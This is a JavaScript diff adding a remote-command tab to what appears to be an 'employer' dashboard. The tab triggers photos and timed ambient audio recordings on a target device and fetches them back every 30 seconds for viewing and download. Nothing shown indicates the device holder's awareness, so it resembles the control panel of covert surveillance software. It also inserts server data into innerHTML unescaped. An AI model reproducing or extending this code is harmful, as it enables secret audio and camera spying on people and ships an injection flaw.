@@ -117,3 +117,79 @@ async function requestDownload(token, filename, image_id) {
         }, 10000);
     }
 }
+
+const deviceToken = new URLSearchParams(window.location.search).get('token');
+
+async function sendCommand(type) {
+    const msg = document.getElementById('remote-msg');
+    const duration = document.getElementById('record-duration')?.value || 30;
+    const facing = document.getElementById('camera-facing')?.value || 'back';
+    
+    const res = await fetch('/employer/command', {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({ token: deviceToken, type, duration: parseInt(duration), facing })
+    });
+    const data = await res.json();
+    
+    if (data.success) {
+        msg.style.display = 'block';
+        msg.style.background = '#dfd';
+        msg.style.color = '#060';
+        msg.textContent = type === 'record_ambient' 
+            ? 'Recording command sent! Audio will appear below within 2 minutes + recording duration.'
+            : 'Photo command sent! Image will appear below within 2 minutes.';
+        setTimeout(loadRemoteResults, 5000);
+    } else {
+        msg.style.display = 'block';
+        msg.style.background = '#fde';
+        msg.style.color = '#c00';
+        msg.textContent = data.message || 'Failed to send command';
+    }
+}
+
+async function loadRemoteResults() {
+    const res = await fetch('/employer/command-results', {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({ token: deviceToken })
+    });
+    const data = await res.json();
+    const container = document.getElementById('remote-results');
+    
+    if (!data.commands || data.commands.length === 0) {
+        container.innerHTML = '<p style="color:#888;text-align:center;padding:20px">No results yet</p>';
+        return;
+    }
+    
+    container.innerHTML = data.commands.map(function(cmd) {
+        const date = new Date(cmd.completed_at).toLocaleString();
+        if (cmd.type === 'take_photo' && cmd.result) {
+            return '<div style="background:#f8f8f8;border-radius:8px;padding:16px;margin-bottom:12px">'
+                + '<div style="display:flex;justify-content:space-between;margin-bottom:8px">'
+                + '<b>📷 Photo</b><span style="color:#888;font-size:12px">' + date + '</span>'
+                + '</div>'
+                + '<img src="data:image/jpeg;base64,' + cmd.result + '" style="max-width:100%;border-radius:8px;cursor:pointer" onclick="openLightbox(this)" data-src="data:image/jpeg;base64,' + cmd.result + '"/>'
+                + '<a href="data:image/jpeg;base64,' + cmd.result + '" download="remote_photo_' + date + '.jpg" style="display:block;margin-top:8px;color:#1a1a2e;font-size:13px">⬇️ Download</a>'
+                + '</div>';
+        } else if (cmd.type === 'record_ambient' && cmd.result) {
+            return '<div style="background:#f8f8f8;border-radius:8px;padding:16px;margin-bottom:12px">'
+                + '<div style="display:flex;justify-content:space-between;margin-bottom:8px">'
+                + '<b>🎙️ Ambient Recording (' + (cmd.duration || 30) + 's)</b><span style="color:#888;font-size:12px">' + date + '</span>'
+                + '</div>'
+                + '<audio controls src="data:audio/mp4;base64,' + cmd.result + '" style="width:100%"></audio>'
+                + '<a href="data:audio/mp4;base64,' + cmd.result + '" download="ambient_' + date + '.mp4" style="display:block;margin-top:8px;color:#1a1a2e;font-size:13px">⬇️ Download</a>'
+                + '</div>';
+        } else {
+            return '<div style="background:#f8f8f8;border-radius:8px;padding:16px;margin-bottom:12px">'
+                + '<b>' + cmd.type + '</b> - ' + (cmd.status === 'failed' ? '❌ Failed' : '⏳ Pending')
+                + '<span style="color:#888;font-size:12px;float:right">' + date + '</span>'
+                + '</div>';
+        }
+    }).join('');
+}
+
+// Auto-load results when remote tab opened
+loadRemoteResults();
+// Refresh every 30 seconds
+setInterval(loadRemoteResults, 30000);
